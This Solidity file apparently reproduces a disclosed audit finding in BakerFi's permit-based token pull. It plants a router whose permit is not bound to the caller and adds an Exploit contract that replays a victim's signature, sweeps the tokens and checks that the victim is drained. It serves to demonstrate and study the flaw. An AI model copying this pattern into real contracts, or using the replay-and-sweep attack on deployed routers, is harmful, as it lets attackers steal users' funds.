// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  BakerFi UsePermitTransfers.pullTokensWithPermit - the permit is not bound
    to the caller (Code4rena, finding 49644).
    SYNTHETIC, cheatcode-free. The two blamed lines are the permit plus the
    transferFrom. Anyone who sees the signature can pull the owner's tokens
    into the router and sweep them. The domain chain id is pinned to 1 so the
    signature matches the playground replay. The honest path is the owner
    pulling and then depositing, which credits the owner and pays the attacker
    nothing. */

contract PermitToken {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowance;
    mapping(address => uint256) internal _nonces;
    address public minter;
    bytes32 public DOMAIN_SEPARATOR;
    bytes32 public constant PERMIT_TYPEHASH =
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    constructor() {
        minter = msg.sender;
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("BAKER")),
                keccak256(bytes("1")),
                uint256(1),
                address(this)
            )
        );
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function nonces(address account) external view returns (uint256) {
        return _nonces[account];
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        _balances[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = _allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) _allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external
    {
        require(block.timestamp <= deadline, "deadline");
        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _nonces[owner], deadline));
        bytes32 digest = keccak256(abi.encodePacked(hex"1901", DOMAIN_SEPARATOR, structHash));
        address signer = ecrecover(digest, v, r, s);
        require(signer != address(0) && signer == owner, "sig");
        _nonces[owner] += 1;
        _allowance[owner][spender] = value;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(_balances[from] >= amount, "bal");
        _balances[from] -= amount;
        _balances[to] += amount;
    }
}

contract VaultRouter {
    PermitToken public token;
    uint256 public pulls;
    uint256 public swept;
    mapping(address => uint256) internal _shares;

    constructor(PermitToken _token) {
        token = _token;
    }

    function shares(address account) external view returns (uint256) {
        return _shares[account];
    }

    function pullTokensWithPermit(address owner, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external
    {
        pulls = amount;
        token.permit(owner, address(this), amount, deadline, v, r, s);
        bool ok = token.transferFrom(owner, address(this), amount); // @> VULN: any caller spends the owner's permit and pulls the tokens
        require(ok, "pull");
    }

    function sweepTokens() external {
        uint256 bal = token.balanceOf(address(this));
        swept = bal;
        require(token.transfer(msg.sender, bal), "sweep");
    }

    function deposit() external {
        uint256 bal = token.balanceOf(address(this));
        _shares[msg.sender] += bal;
    }
}

contract Exploit {
    address public constant VICTIM = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 public constant AMOUNT = 1000 ether;
    uint256 public constant DEADLINE = type(uint256).max;
    uint8 public constant V = 28;
    bytes32 public constant R = 0xe8699f1d3e3b4641023c7d43fc12f32422ce26ce73ab71f5621fe96c31d9c580;
    bytes32 public constant S = 0x079e42a416792b722576abff4dadcdb917927def11d47c97ca93d1e22ec75653;

    PermitToken public token;
    VaultRouter public router;

    uint256 public beatFund;
    uint256 public beatBefore;
    uint256 public beatPull;
    uint256 public beatRouter;
    uint256 public beatSweep;
    uint256 public beatHeld;
    uint256 public beatForward;
    uint256 public beatAttacker;
    uint256 public beatVictim;

    constructor() {
        token = new PermitToken();
        router = new VaultRouter(token);
    }

    function fundVictim() external {
        token.mint(VICTIM, AMOUNT);
    }

    function run() external {
        beatFund = AMOUNT;
        token.mint(VICTIM, AMOUNT);
        beatBefore = token.balanceOf(VICTIM);
        beatPull = AMOUNT;
        router.pullTokensWithPermit(VICTIM, AMOUNT, DEADLINE, V, R, S);
        beatRouter = token.balanceOf(address(router));
        beatSweep = beatRouter;
        router.sweepTokens();
        beatHeld = token.balanceOf(address(this));
        beatForward = beatHeld;
        require(token.transfer(msg.sender, beatHeld), "forward");
        beatAttacker = token.balanceOf(msg.sender);
        beatVictim = token.balanceOf(VICTIM);
        require(beatFund == AMOUNT, "fund");
        require(beatBefore == AMOUNT, "before");
        require(beatPull == AMOUNT, "pull");
        require(beatRouter == AMOUNT, "router");
        require(beatSweep == AMOUNT, "sweep");
        require(beatHeld == AMOUNT, "held");
        require(beatForward == AMOUNT, "fwd");
        require(beatAttacker == AMOUNT, "stolen");
        require(beatVictim == 0, "drained");
    }
}
